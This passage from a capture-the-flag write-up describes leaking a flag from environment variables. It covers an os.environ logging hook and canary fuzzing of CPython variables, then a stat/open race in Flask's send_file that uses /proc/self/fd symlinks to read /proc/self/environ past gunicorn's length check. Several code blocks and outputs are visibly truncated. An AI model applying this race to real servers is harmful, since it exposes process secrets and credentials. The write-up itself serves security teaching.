<span class="hl-meta hl-function-call hl-shell"><span class="hl-variable hl-function hl-shell">libpython3.9.so.1.0-</span></span><span class="hl-meta hl-function-call hl-arguments hl-shell"><span class="hl-keyword hl-operator hl-assignment hl-redirection hl-shell">&gt;</span>getenv(<span class="hl-string hl-quoted hl-double hl-shell"><span class="hl-punctuation hl-definition hl-string hl-begin hl-shell">&quot;</span>LC_ALL<span class="hl-punctuation hl-definition hl-string hl-end hl-shell">&quot;</span></span></span><span class="hl-meta hl-function-call hl-shell"></span>)                         <span class="hl-keyword hl-operator hl-assignment hl-shell">=</span> <span class="hl-meta hl-function-call hl-shell"><span class="hl-variable hl-function hl-shell">nil</span></span>
<span class="hl-meta hl-function-call hl-shell"><span class="hl-variable hl-function hl-shell">libpython3.9.so.1.0-</span></span><span class="hl-meta hl-function-call hl-arguments hl-shell"><span class="hl-keyword hl-operator hl-assignment hl-redirection hl-shell">&gt;</span>getenv(<span class="hl-string hl-quoted hl-double hl-shell"><span class="hl-punctuation hl-definition hl-string hl-begin hl-shell">&quot;</span>PATH<span class="hl-punctuation hl-definition hl-string hl-end hl-shell">&quot;</span></span></span><span class="hl-meta hl-function-call hl-shell"></span>)                           <span class="hl-keyword hl-operator hl-assignment hl-shell">=</span> <span class="hl-meta hl-function-call hl-shell"><span class="hl-variable hl-function hl-shell"><span class="hl-string hl-quoted hl-double hl-shell"><span class="hl-punctuation hl-definition hl-string hl-begin hl-shell">&quot;</span>/usr/local/bin:/usr/local/sbin:/<span class="hl-punctuation hl-definition hl-string hl-end hl-shell">&quot;</span></span>...</span></span>
<span class="hl-meta hl-function-call hl-shell"><span class="hl-variable hl-function hl-shell">+++</span></span><span class="hl-meta hl-function-call hl-arguments hl-shell"> exited (status 0</span><span class="hl-meta hl-function-call hl-shell"></span>) <span class="hl-meta hl-function-call hl-shell"><span class="hl-variable hl-function hl-shell">+++</span></span>
</span></code></pre>
<p>Unfortunately, that seems quite limited. <code>PATH</code> is already blocked by the program, leaving us with <code>LC_ALL</code>, which is only used for some small localization details. This isn't the end of the story, however, because apart from calling a function such as <code>getenv</code>, a program can also just read from the environment variables already in memory and access them like a dictionary in Python (<code>os.environ</code>).</p>
<p>At the start of <code>runner.py</code>, we can insert a small snippet to hook these environment variable accesses and run <code>runner.py</code>:</p>
<pre><code data-lang="Python"><span class="hl-source hl-python"><span class="hl-meta hl-statement hl-import hl-python"><span class="hl-keyword hl-control hl-import hl-python">import</span> <span class="hl-meta hl-qualified-name hl-python"><span class="hl-meta hl-generic-name hl-python">os</span></span></span>

<span class="hl-comment hl-line hl-number-sign hl-python"><span class="hl-punctuation hl-definition hl-comment hl-python">#</span> https://noamlerner.com/posts/python_environment_hook/
</span><span class="hl-meta hl-class hl-python"><span class="hl-storage hl-type hl-class hl-python"><span class="hl-keyword hl-declaration hl-class hl-python">class</span></span> <span class="hl-entity hl-name hl-class hl-python"><span class="hl-meta hl-generic-name hl-python">EnvAccessLoggingDict</span></span><span class="hl-meta hl-class hl-inheritance hl-python"><span class="hl-punctuation hl-section hl-inheritance hl-begin hl-python">(</span></span></span><span class="hl-meta hl-class hl-inheritance hl-python"><span class="hl-entity hl-other hl-inherited-class hl-python">os<span class="hl-punctuation hl-accessor hl-dot hl-python">.</span>_Environ</span><span class="hl-punctuation hl-section hl-inheritance hl-end hl-python">)</span></span><span class="hl-meta hl-class hl-python"><span class="hl-punctuation hl-section hl-class hl-begin hl-python">:</span></span>
<span class="hl-meta hl-function hl-python">    <span class="hl-storage hl-type hl-function hl-python"><span class="hl-keyword hl-declaration hl-function hl-python">def</span></span> <span class="hl-entity hl-name hl-function hl-python"><span class="hl-support hl-function hl-magic hl-python">__init__</span></span></span><span class="hl-meta hl-function hl-parameters hl-python"><span class="hl-punctuation hl-section hl-parameters hl-begin hl-python">(</span></span><span class="hl-meta hl-function hl-parameters hl-python">
        <span class="hl-variable hl-parameter hl-python">self</span><span class="hl-punctuation hl-separator hl-parameters hl-python">,</span>
    <span class="hl-punctuation hl-section hl-parameters hl-end hl-python">)</span></span><span class="hl-meta hl-function hl-python"> </span><span class="hl-meta hl-function hl-annotation hl-return hl-python"><span class="hl-punctuation hl-separator hl-annotation hl-return hl-python">-&gt;</span> <span class="hl-constant hl-language hl-python">None</span></span><span class="hl-meta hl-function hl-python"><span class="hl-punctuation hl-section hl-function hl-begin hl-python">:</span></span>
        <span class="hl-meta hl-qualified-name hl-python"><span class="hl-meta hl-generic-name hl-python">identity</span></span> <span class="hl-keyword hl-operator hl-assignment hl-python">=</span> <span class="hl-meta hl-function hl-inline hl-python"><span class="hl-storage hl-type hl-function hl-inline hl-python"><span class="hl-keyword hl-declaration hl-function hl-inline hl-python">lambda</span></span></span><span class="hl-meta hl-function hl-inline hl-python"><span class="hl-meta hl-function hl-inline hl-parameters hl-python"> <span class="hl-variable hl-parameter hl-python">x</span><span class="hl-punctuation hl-section hl-function hl-begin hl-python">:</span></span></span><span class="hl-meta hl-function hl-inline hl-body hl-python"> <span class="hl-meta hl-qualified-name hl-python"><span class="hl-meta hl-generic-name hl-python">x</span></span></span>
        <span class="hl-meta hl-function-call hl-python"><span class="hl-meta hl-qualified-name hl-python"><span class="hl-variable hl-function hl-python"><span class="hl-support hl-function hl-builtin hl-python">super</span></span></span></span><span class="hl-meta hl-function-call hl-arguments hl-python"><span class="hl-punctuation hl-section hl-arguments hl-begin hl-python">(</span><span class="hl-punctuation hl-section hl-arguments hl-end hl-python">)</span></span><span class="hl-meta hl-function-call hl-python"><span class="hl-meta hl-qualified-name hl-python"><span class="hl-punctuation hl-accessor hl-dot hl-python">.</span></span><span class="hl-meta hl-qualified-name hl-python"><span class="hl-variable hl-function hl-python"><span class="hl-support hl-function hl-magic hl-python">__init__</span></span></span></span><span class="hl-meta hl-function-call hl-arguments hl-python"><span class="hl-punctuation hl-section hl-arguments hl-begin hl-python">(</span>
            <span class="hl-variable hl-parameter hl-python">data</span><span class="hl-keyword hl-operator hl-assignment hl-python">=</span><span class="hl-meta hl-qualified-name hl-python"><span class="hl-meta hl-generic-name hl-python">os</span><span class="hl-punctuation hl-accessor hl-dot hl-python">.</span><span class="hl-meta hl-generic-name hl-python">environ</span></span><span class="hl-punctuation hl-separator hl-arguments hl-python">,</span>
            <span class="hl-variable hl-parameter hl-python">encodekey</span><span class="hl-keyword hl-operator hl-assignment hl-python">=</span><span class="hl-meta hl-qualified-name hl-python"><span class="hl-meta hl-generic-name hl-python">identity</span></span><span class="hl-punctuation hl-separator hl-arguments hl-python">,</span> <span class="hl-variable hl-parameter hl-python">decodekey</span><span class="hl-keyword hl-operator hl-assignment hl-python">=</span><span class="hl-meta hl-qualified-name hl-python"><span class="hl-meta hl-generic-name hl-python">identity</span></span><span class="hl-punctuation hl-separator hl-arguments hl-python">,</span> <span class="hl-variable hl-parameter hl-python">encodevalue</span><span class="hl-keyword hl-operator hl-assignment hl-python">=</span><span class="hl-meta hl-qualified-name hl-python"><span class="hl-meta hl-generic-name hl-python">identity</span></span><span class="hl-punctuation hl-separator hl-arguments hl-python">,</span> <span class="hl-variable hl-parameter hl-python">decodevalue</span><span class="hl-keyword hl-operator hl-assignment hl-python">=</span><span class="hl-meta hl-qualified-name hl-python"><span class="hl-meta hl-generic-name hl-python">identity</span></span>
        <span class="hl-punctuation hl-section hl-arguments hl-end hl-python">)</span></span>

<span class="hl-meta hl-function hl-python">    <span class="hl-storage hl-type hl-function hl-python"><span class="hl-keyword hl-declaration hl-function hl-python">def</span></span> <span class="hl-entity hl-name hl-function hl-python"><span class="hl-support hl-function hl-magic hl-python">__getitem__</span></span></span><span class="hl-meta hl-function hl-parameters hl-python"><span class="hl-punctuation hl-section hl-parameters hl-begin hl-python">(</span></span><span class="hl-meta hl-function hl-parameters hl-python"><span class="hl-variable hl-parameter hl-python">self</span><span class="hl-punctuation hl-separator hl-parameters hl-python">,</span> <span class="hl-variable hl-parameter hl-python">key</span></span><span class="hl-meta hl-function hl-parameters hl-annotation hl-python"><span class="hl-punctuation hl-separator hl-annotation hl-parameter hl-python">:</span> <span class="hl-meta hl-qualified-name hl-python"><span class="hl-support hl-type hl-python">str</span></span></span><span class="hl-meta hl-function hl-parameters hl-python"><span class="hl-punctuation hl-section hl-parameters hl-end hl-python">)</span></span><span class="hl-meta hl-function hl-python"> </span><span class="hl-meta hl-function hl-annotation hl-return hl-python"><span class="hl-punctuation hl-separator hl-annotation hl-return hl-python">-&gt;</span> <span class="hl-meta hl-qualified-name hl-python"><span class="hl-support hl-type hl-python">str</span></span></span><span class="hl-meta hl-function hl-python"><span class="hl-punctuation hl-section hl-function hl-begin hl-python">:</span></span>
        <span class="hl-meta hl-function-call hl-python"><span class="hl-meta hl-qualified-name hl-python"><span class="hl-variable hl-function hl-python"><span class="hl-support hl-function hl-builtin hl-python">print</span></span></span></span><span class="hl-meta hl-function-call hl-arguments hl-python"><span class="hl-punctuation hl-section hl-arguments hl-begin hl-python">(</span><span class="hl-storage hl-type hl-string hl-python">f</span><span class="hl-meta hl-string hl-interpolated hl-python"><span class="hl-string hl-quoted hl-double hl-python"><span class="hl-punctuation hl-definition hl-string hl-begin hl-python">&quot;</span></span></span><span class="hl-meta hl-string hl-interpolated hl-python"><span class="hl-string hl-quoted hl-double hl-python">Accessed os.environ[</span><span class="hl-meta hl-interpolation hl-python"><span class="hl-punctuation hl-section hl-interpolation hl-begin hl-python">{</span><span class="hl-source hl-python hl-embedded"><span class="hl-meta hl-qualified-name hl-python"><span class="hl-meta hl-generic-name hl-python">key</span></span></span></span><span class="hl-meta hl-interpolation hl-python"><span class="hl-punctuation hl-section hl-interpolation hl-end hl-python">}</span></span><span class="hl-string hl-quoted hl-double hl-python">]<span class="hl-punctuation hl-definition hl-string hl-end hl-python">&quot;</span></span></span><span class="hl-punctuation hl-section hl-arguments hl-end hl-python">)</span></span>
        <span class="hl-keyword hl-control hl-flow hl-return hl-python">return</span> <span class="hl-meta hl-function-call hl-python"><span class="hl-meta hl-qualified-name hl-python"><span class="hl-variable hl-function hl-python"><span class="hl-support hl-function hl-builtin hl-python">super</span></span></span></span><span class="hl-meta hl-function-call hl-arguments hl-python"><span class="hl-punctuation hl-section hl-arguments hl-begin hl-python">(</span><span class="hl-punctuation hl-section hl-arguments hl-end hl-python">)</span></span><span class="hl-meta hl-function-call hl-python"><span class="hl-meta hl-qualified-name hl-python"><span class="hl-punctuation hl-accessor hl-dot hl-python">.</span></span><span class="hl-meta hl-qualified-name hl-python"><span class="hl-variable hl-function hl-python"><span class="hl-support hl-function hl-magic hl-python">__getitem__</span></span></span></span><span class="hl-meta hl-function-call hl-arguments hl-python"><span class="hl-punctuation hl-section hl-arguments hl-begin hl-python">(</span><span class="hl-meta hl-qualified-name hl-python"><span class="hl-meta hl-generic-name hl-python">key</span></span><span class="hl-punctuation hl-section hl-arguments hl-end hl-python">)</span></span>

<span class="hl-meta hl-qualified-name hl-python"><span class="hl-meta hl-generic-name hl-python">os</span><span class="hl-punctuation hl-accessor hl-dot hl-python">.</span><span class="hl-meta hl-generic-name hl-python">environ</span></span> <span class="hl-keyword hl-operator hl-assignment hl-python">=</span> <span class="hl-meta hl-function-call hl-python"><span class="hl-meta hl-qualified-name hl-python"><span class="hl-variable hl-function hl-python"><span class="hl-meta hl-generic-name hl-python">EnvAccessLoggingDict</span></span></span></span><span class="hl-meta hl-function-call hl-arguments hl-python"><span class="hl-punctuation hl-section hl-arguments hl-begin hl-python">(</span><span class="hl-punctuation hl-section hl-arguments hl-end hl-python">)</span></span>
</span></code></pre>
<p>But unfortunately, again this also doesn't find any environment variable uses. If we look deeper into it, this is mainly because <code>-I</code> is set, which doesn't do us many favors:</p>
<blockquote>
<p><code>-I</code> option can be used to run the script in isolated mode where <code>sys.path</code> contains neither the current directory nor the user’s site-packages directory. All <code>PYTHON*</code> environment variables are ignored, too.</p>
</blockquote>
<p>So if no variable affects the execution of the <code>runner.py</code> script, why do we have control over it? How can we do something with the flag value?</p>
<p>Remember: we can set the flag in the value of any environment variable, and we have a file read primitive. So, is anything stored on disk while executing that we missed?</p>
<p>I went for fuzzing. Cloned <a href="https://github.com/python/cpython" target="_blank">cpython</a>, searched for environment variable-like words and gave them all a recognizable value like <code>j0r1an</code> that wouldn't normally appear on the system:</p>
<pre><code data-lang="Bash"><span class="hl-source hl-shell hl-bash"><span class="hl-meta hl-function-call hl-shell"><span class="hl-variable hl-function hl-shell">$</span></span><span class="hl-meta hl-function-call hl-arguments hl-shell"> rg<span class="hl-variable hl-parameter hl-option hl-shell"><span class="hl-punctuation hl-definition hl-parameter hl-shell"> -</span>w</span> <span class="hl-string hl-quoted hl-single hl-shell"><span class="hl-punctuation hl-definition hl-string hl-begin hl-shell">&#39;</span>[A-Z_][A-Z0-9_]{2,}<span class="hl-punctuation hl-definition hl-string hl-end hl-shell">&#39;</span></span><span class="hl-variable hl-parameter hl-option hl-shell"><span class="hl-punctuation hl-definition hl-parameter hl-shell"> -</span>oI</span></span> <span class="hl-keyword hl-operator hl-logical hl-pipe hl-shell">|</span> <span class="hl-meta hl-function-call hl-shell"><span class="hl-variable hl-function hl-shell">sort</span></span><span class="hl-meta hl-function-call hl-arguments hl-shell"><span class="hl-variable hl-parameter hl-option hl-shell"><span class="hl-punctuation hl-definition hl-parameter hl-shell"> -</span>u</span></span> <span class="hl-keyword hl-operator hl-logical hl-pipe hl-shell">|</span> <span class="hl-meta hl-function-call hl-shell"><span class="hl-variable hl-function hl-shell">sed</span></span><span class="hl-meta hl-function-call hl-arguments hl-shell"> <span class="hl-string hl-quoted hl-single hl-shell"><span class="hl-punctuation hl-definition hl-string hl-begin hl-shell">&#39;</span>s/.*/&amp;=j0r1an_&amp;/<span class="hl-punctuation hl-definition hl-string hl-end hl-shell">&#39;</span></span> <span class="hl-keyword hl-operator hl-assignment hl-redirection hl-shell">&gt;</span> vars.txt</span>

<span class="hl-variable hl-other hl-readwrite hl-assignment hl-shell">AC_CHECK_MEMBERS</span><span class="hl-keyword hl-operator hl-assignment hl-shell">=</span><span class="hl-string hl-unquoted hl-shell">j0r1an_AC_CHECK_MEMBERS</span>

<p>Then, run the runner with this packed environment and search the whole filesystem for any traces of the canary string <code>j0r1an</code>:</p>
<pre><code data-lang="Bash"><span class="hl-source hl-shell hl-bash"><span class="hl-meta hl-function-call hl-shell"><span class="hl-support hl-function hl-source hl-shell">source</span></span><span class="hl-meta hl-function-call hl-arguments hl-shell"> vars.txt</span>

<p>The <code>cmdline</code> is a false positive as it is matching the <code>grep</code> command itself. But in <code>/proc/16998/environ</code> it found content containing the environment values, which is not very surprising. We already tried to read <code>/proc/self/environ</code> with the file read earlier, but due to its 0 size, Flask can't return any of its bytes.</p>
<h2 id="flask-send_file-size-race-condition">Flask send_file() size Race Condition</h2>
<p>This is the last and most interesting part of the challenge. While digging into the source code of Flask's <code>send_file()</code> function and following where its first argument <code>path_or_file</code> is used. This lands us in <a href="https://github.com/pallets/werkzeug/blob/b24c8ec7b05729276c75a05507eeaec4ed04dda8/src/werkzeug/utils.py#L438-L490" target="_blank"><code>werkzeug/utils.py</code></a>. The <code>send_file</code> function here first calls <code>os.stat(path)</code> for the <code>Content-Length</code> header, then later on <code>open(path)</code> to actually read the content:</p>

        <span class="hl-meta hl-qualified-name hl-python"><span class="hl-meta hl-generic-name hl-python">rv</span><span class="hl-punctuation hl-accessor hl-dot hl-python">.</span><span class="hl-meta hl-generic-name hl-python">content_length</span></span> <span class="hl-keyword hl-operator hl-assignment hl-python">=</span> <span class="hl-meta hl-qualified-name hl-python"><span class="hl-meta hl-generic-name hl-python">size</span></span>
</span></code></pre>
<p>The weird thing is that <code>/proc/self/environ</code> reports a size of 0 when running <code>os.stat</code> on it, because it is a special dynamically generated file by the OS.</p>
<pre><code data-lang="Shell"><span class="hl-source hl-shell hl-shell"><span class="hl-meta hl-function-call hl-identifier hl-shell"><span class="hl-meta hl-command hl-shell"><span class="hl-variable hl-function hl-shell">$</span></span></span><span class="hl-meta hl-function-call hl-arguments hl-shell"> <span class="hl-meta hl-string hl-glob hl-shell"><span class="hl-string hl-unquoted hl-shell">stat</span></span> <span class="hl-meta hl-string hl-glob hl-shell"><span class="hl-string hl-unquoted hl-shell">/proc/self/environ</span></span></span>
  <span class="hl-meta hl-function-call hl-identifier hl-shell"><span class="hl-meta hl-command hl-shell"><span class="hl-variable hl-function hl-shell">File:</span></span></span><span class="hl-meta hl-function-call hl-arguments hl-shell"> <span class="hl-meta hl-string hl-glob hl-shell"><span class="hl-string hl-unquoted hl-shell">/proc/self/environ</span></span></span>
  <span class="hl-meta hl-function-call hl-identifier hl-shell"><span class="hl-meta hl-command hl-shell"><span class="hl-variable hl-function hl-shell">Size:</span></span></span><span class="hl-meta hl-function-call hl-arguments hl-shell"> <span class="hl-meta hl-number hl-integer hl-decimal hl-shell"><span class="hl-constant hl-numeric hl-value hl-shell">0</span></span>               <span class="hl-meta hl-string hl-glob hl-shell"><span class="hl-string hl-unquoted hl-shell">Blocks:</span></span> <span class="hl-meta hl-number hl-integer hl-decimal hl-shell"><span class="hl-constant hl-numeric hl-value hl-shell">0</span></span>          <span class="hl-meta hl-string hl-glob hl-shell"><span class="hl-string hl-unquoted hl-shell">IO</span></span> <span class="hl-meta hl-string hl-glob hl-shell"><span class="hl-string hl-unquoted hl-shell">Block:</span></span> <span class="hl-meta hl-number hl-integer hl-decimal hl-shell"><span class="hl-constant hl-numeric hl-value hl-shell">1024</span></span>   <span class="hl-meta hl-string hl-glob hl-shell"><span class="hl-string hl-unquoted hl-shell">regular</span></span> <span class="hl-meta hl-string hl-glob hl-shell"><span class="hl-string hl-unquoted hl-shell">empty</span></span> <span class="hl-meta hl-string hl-glob hl-shell"><span class="hl-string hl-unquoted hl-shell">file</span></span></span>
<span class="hl-meta hl-function-call hl-identifier hl-shell"><span class="hl-meta hl-command hl-shell"><span class="hl-variable hl-function hl-shell">Device:</span></span></span><span class="hl-meta hl-function-call hl-arguments hl-shell"> <span class="hl-meta hl-string hl-glob hl-shell"><span class="hl-string hl-unquoted hl-shell">98h/152d</span></span>        <span class="hl-meta hl-string hl-glob hl-shell"><span class="hl-string hl-unquoted hl-shell">Inode:</span></span> <span class="hl-meta hl-number hl-integer hl-decimal hl-shell"><span class="hl-constant hl-numeric hl-value hl-shell">648338</span></span>      <span class="hl-meta hl-string hl-glob hl-shell"><span class="hl-string hl-unquoted hl-shell">Links:</span></span> <span class="hl-meta hl-number hl-integer hl-decimal hl-shell"><span class="hl-constant hl-numeric hl-value hl-shell">1</span></span></span>
<span class="hl-meta hl-function-call hl-identifier hl-shell"><span class="hl-meta hl-command hl-shell"><span class="hl-variable hl-function hl-shell">Access:</span></span></span><span class="hl-meta hl-function-call hl-arguments hl-shell"> <span class="hl-meta hl-string hl-glob hl-shell"></span><span class="hl-meta hl-string hl-glob hl-shell"><span class="hl-string hl-unquoted hl-shell">(0400/-r--------</span></span></span><span class="hl-invalid hl-illegal hl-stray hl-shell">)</span>  <span class="hl-meta hl-function-call hl-identifier hl-shell"><span class="hl-meta hl-command hl-shell"><span class="hl-variable hl-function hl-shell">Uid:</span></span></span><span class="hl-meta hl-function-call hl-arguments hl-shell"> <span class="hl-meta hl-string hl-glob hl-shell"></span><span class="hl-meta hl-string hl-glob hl-shell"><span class="hl-string hl-unquoted hl-shell">(</span></span> <span class="hl-meta hl-string hl-glob hl-shell"><span class="hl-string hl-unquoted hl-shell">1000/</span></span>     <span class="hl-meta hl-string hl-glob hl-shell"><span class="hl-string hl-unquoted hl-shell">ctf</span></span></span><span class="hl-invalid hl-illegal hl-stray hl-shell">)</span>   <span class="hl-meta hl-function-call hl-identifier hl-shell"><span class="hl-meta hl-command hl-shell"><span class="hl-variable hl-function hl-shell">Gid:</span></span></span><span class="hl-meta hl-function-call hl-arguments hl-shell"> <span class="hl-meta hl-string hl-glob hl-shell"></span><span class="hl-meta hl-string hl-glob hl-shell"><span class="hl-string hl-unquoted hl-shell">(</span></span> <span class="hl-meta hl-string hl-glob hl-shell"><span class="hl-string hl-unquoted hl-shell">1000/</span></span>     <span class="hl-meta hl-string hl-glob hl-shell"><span class="hl-string hl-unquoted hl-shell">ctf</span></span></span><span class="hl-invalid hl-illegal hl-stray hl-shell">)</span>
</span></code></pre>
<p>But werkzeug still opens the file and successfully reads its data. What's stopping it is the <a href="https://gunicorn.org" target="_blank"><strong>gunicorn</strong></a> layer <a href="https://github.com/benoitc/gunicorn/blob/a8283bbf5e1416d0dd13f994f71ec2761988aeab/gunicorn/http/wsgi.py#L460-L462" target="_blank">explicitly stopping with sending in <code>http/wsgi.py</code></a> if the <code>Content-Length:</code> is reached.</p>

            <span class="hl-meta hl-qualified-name hl-python"><span class="hl-meta hl-generic-name hl-python">tosend</span></span> <span class="hl-keyword hl-operator hl-assignment hl-python">=</span> <span class="hl-meta hl-function-call hl-python"><span class="hl-meta hl-qualified-name hl-python"><span class="hl-variable hl-function hl-python"><span class="hl-support hl-function hl-builtin hl-python">min</span></span></span></span><span class="hl-meta hl-function-call hl-arguments hl-python"><span class="hl-punctuation hl-section hl-arguments hl-begin hl-python">(</span><span class="hl-meta hl-qualified-name hl-python"><span class="hl-variable hl-language hl-python">self</span><span class="hl-punctuation hl-accessor hl-dot hl-python">.</span><span class="hl-meta hl-generic-name hl-python">response_length</span></span> <span class="hl-keyword hl-operator hl-arithmetic hl-python">-</span> <span class="hl-meta hl-qualified-name hl-python"><span class="hl-variable hl-language hl-python">self</span><span class="hl-punctuation hl-accessor hl-dot hl-python">.</span><span class="hl-meta hl-generic-name hl-python">sent</span></span><span class="hl-punctuation hl-separator hl-arguments hl-python">,</span> <span class="hl-meta hl-qualified-name hl-python"><span class="hl-meta hl-generic-name hl-python">tosend</span></span><span class="hl-punctuation hl-section hl-arguments hl-end hl-python">)</span></span>
            <span class="hl-meta hl-statement hl-conditional hl-if hl-python"><span class="hl-keyword hl-control hl-conditional hl-if hl-python">if</span> <span class="hl-meta hl-qualified-name hl-python"><span class="hl-meta hl-generic-name hl-python">tosend</span></span> <span class="hl-keyword hl-operator hl-comparison hl-python">&lt;</span> <span class="hl-meta hl-qualified-name hl-python"><span class="hl-meta hl-generic-name hl-python">arglen</span></span><span class="hl-punctuation hl-section hl-block hl-conditional hl-if hl-python">:</span></span>
                <span class="hl-meta hl-qualified-name hl-python"><span class="hl-meta hl-generic-name hl-python">arg</span></span> <span class="hl-keyword hl-operator hl-assignment hl-python">=</span> <span class="hl-meta hl-item-access hl-python"><span class="hl-meta hl-qualified-name hl-python"><span class="hl-meta hl-generic-name hl-python">arg</span></span></span><span class="hl-meta hl-item-access hl-python"><span class="hl-punctuation hl-section hl-brackets hl-begin hl-python">[</span></span><span class="hl-meta hl-item-access hl-arguments hl-python"><span class="hl-punctuation hl-separator hl-slice hl-python">:</span><span class="hl-meta hl-qualified-name hl-python"><span class="hl-meta hl-generic-name hl-python">tosend</span></span></span><span class="hl-meta hl-item-access hl-python"><span class="hl-punctuation hl-section hl-brackets hl-end hl-python">]</span></span>

        <span class="hl-meta hl-function-call hl-python"><span class="hl-meta hl-qualified-name hl-python"><span class="hl-meta hl-generic-name hl-python">util</span></span><span class="hl-meta hl-qualified-name hl-python"><span class="hl-punctuation hl-accessor hl-dot hl-python">.</span></span><span class="hl-meta hl-qualified-name hl-python"><span class="hl-variable hl-function hl-python"><span class="hl-meta hl-generic-name hl-python">write</span></span></span></span><span class="hl-meta hl-function-call hl-arguments hl-python"><span class="hl-punctuation hl-section hl-arguments hl-begin hl-python">(</span><span class="hl-meta hl-qualified-name hl-python"><span class="hl-variable hl-language hl-python">self</span><span class="hl-punctuation hl-accessor hl-dot hl-python">.</span><span class="hl-meta hl-generic-name hl-python">sock</span></span><span class="hl-punctuation hl-separator hl-arguments hl-python">,</span> <span class="hl-meta hl-qualified-name hl-python"><span class="hl-meta hl-generic-name hl-python">arg</span></span><span class="hl-punctuation hl-separator hl-arguments hl-python">,</span> <span class="hl-meta hl-qualified-name hl-python"><span class="hl-variable hl-language hl-python">self</span><span class="hl-punctuation hl-accessor hl-dot hl-python">.</span><span class="hl-meta hl-generic-name hl-python">chunked</span></span><span class="hl-punctuation hl-section hl-arguments hl-end hl-python">)</span></span>
</span></code></pre>
<p>And because our file reports a size of 0, it will always send 0 bytes back to us. It seems impossible, until we factor in <em>time</em>. Because there are actually two operations on our file at two different moments in time:</p>
<ol>
<li><code>os.stat()</code></li>
<li><code>open()</code></li>
</ol>
<p>If during step 1, at the path there is some large file with a real size &gt;0, which we can quickly swap for a symlink to <code>/proc/self/environ</code> before step 2, at step 2 the environment is read again but with a <code>Content-Length:</code> reporting a much larger size. gunicorn would let the data pass, and we can read the environment variables.</p>
<p>This requires RCE on the machine; creating and moving symlinks isn't realistic. Right? Right?!</p>
<p>Then I suddenly remembered a trick from a past CTF: Every <code>open()</code> call secretly &quot;writes&quot; a symlink to <code>/proc/self/fd/3</code> (or a higher file descriptor) pointing to the open file:</p>
<pre><code data-lang="Python"><span class="hl-source hl-python"><span class="hl-keyword hl-operator hl-comparison hl-python">&gt;</span><span class="hl-keyword hl-operator hl-comparison hl-python">&gt;</span><span class="hl-keyword hl-operator hl-comparison hl-python">&gt;</span> <span class="hl-meta hl-qualified-name hl-python"><span class="hl-meta hl-generic-name hl-python">passwd</span></span> <span class="hl-keyword hl-operator hl-assignment hl-python">=</span> <span class="hl-meta hl-function-call hl-python"><span class="hl-meta hl-qualified-name hl-python"><span class="hl-variable hl-function hl-python"><span class="hl-support hl-function hl-builtin hl-python">open</span></span></span></span><span class="hl-meta hl-function-call hl-arguments hl-python"><span class="hl-punctuation hl-section hl-arguments hl-begin hl-python">(</span><span class="hl-meta hl-string hl-python"><span class="hl-string hl-quoted hl-double hl-python"><span class="hl-punctuation hl-definition hl-string hl-begin hl-python">&quot;</span></span></span><span class="hl-meta hl-string hl-python"><span class="hl-string hl-quoted hl-double hl-python">/etc/passwd<span class="hl-punctuation hl-definition hl-string hl-end hl-python">&quot;</span></span></span><span class="hl-punctuation hl-section hl-arguments hl-end hl-python">)</span></span>
</span></code></pre>
<pre><code data-lang="Shell"><span class="hl-source hl-shell hl-shell"><span class="hl-meta hl-function-call hl-identifier hl-shell"><span class="hl-meta hl-command hl-shell"><span class="hl-variable hl-function hl-shell">$</span></span></span><span class="hl-meta hl-function-call hl-arguments hl-shell"> <span class="hl-meta hl-string hl-glob hl-shell"><span class="hl-string hl-unquoted hl-shell">ls</span></span> <span class="hl-meta hl-parameter hl-option hl-shell"><span class="hl-variable hl-parameter hl-option hl-shell"><span class="hl-punctuation hl-definition hl-parameter hl-shell">-</span>l</span></span> <span class="hl-meta hl-string hl-glob hl-shell"><span class="hl-string hl-unquoted hl-shell">/proc/452/fd</span></span></span>
<span class="hl-meta hl-function-call hl-identifier hl-shell"><span class="hl-meta hl-command hl-shell"><span class="hl-variable hl-function hl-shell">total</span></span></span><span class="hl-meta hl-function-call hl-arguments hl-shell"> <span class="hl-meta hl-number hl-integer hl-decimal hl-shell"><span class="hl-constant hl-numeric hl-value hl-shell">0</span></span></span>
<span class="hl-meta hl-function-call hl-identifier hl-shell"><span class="hl-meta hl-command hl-shell"><span class="hl-variable hl-function hl-shell">lrwx------</span></span></span><span class="hl-meta hl-function-call hl-arguments hl-shell"> <span class="hl-meta hl-number hl-integer hl-decimal hl-shell"><span class="hl-constant hl-numeric hl-value hl-shell">1</span></span> <span class="hl-meta hl-string hl-glob hl-shell"><span class="hl-string hl-unquoted hl-shell">ctf</span></span> <span class="hl-meta hl-string hl-glob hl-shell"><span class="hl-string hl-unquoted hl-shell">ctf</span></span> <span class="hl-meta hl-number hl-integer hl-decimal hl-shell"><span class="hl-constant hl-numeric hl-value hl-shell">0</span></span> <span class="hl-meta hl-string hl-glob hl-shell"><span class="hl-string hl-unquoted hl-shell">-</span></span><span class="hl-meta hl-redirection hl-shell"><span class="hl-keyword hl-operator hl-assignment hl-redirection hl-shell">&gt;</span> <span class="hl-meta hl-string hl-glob hl-shell"><span class="hl-string hl-unquoted hl-shell">/dev/pts/1</span></span></span></span>

</span></code></pre>
<p>And these file descriptors are re-used. If I close the previous and open another one, we see it changed:</p>
<pre><code data-lang="Python"><span class="hl-source hl-python"><span class="hl-keyword hl-operator hl-comparison hl-python">&gt;</span><span class="hl-keyword hl-operator hl-comparison hl-python">&gt;</span><span class="hl-keyword hl-operator hl-comparison hl-python">&gt;</span> <span class="hl-meta hl-function-call hl-python"><span class="hl-meta hl-qualified-name hl-python"><span class="hl-meta hl-generic-name hl-python">passwd</span></span><span class="hl-meta hl-qualified-name hl-python"><span class="hl-punctuation hl-accessor hl-dot hl-python">.</span></span><span class="hl-meta hl-qualified-name hl-python"><span class="hl-variable hl-function hl-python"><span class="hl-meta hl-generic-name hl-python">close</span></span></span></span><span class="hl-meta hl-function-call hl-arguments hl-python"><span class="hl-punctuation hl-section hl-arguments hl-begin hl-python">(</span><span class="hl-punctuation hl-section hl-arguments hl-end hl-python">)</span></span>
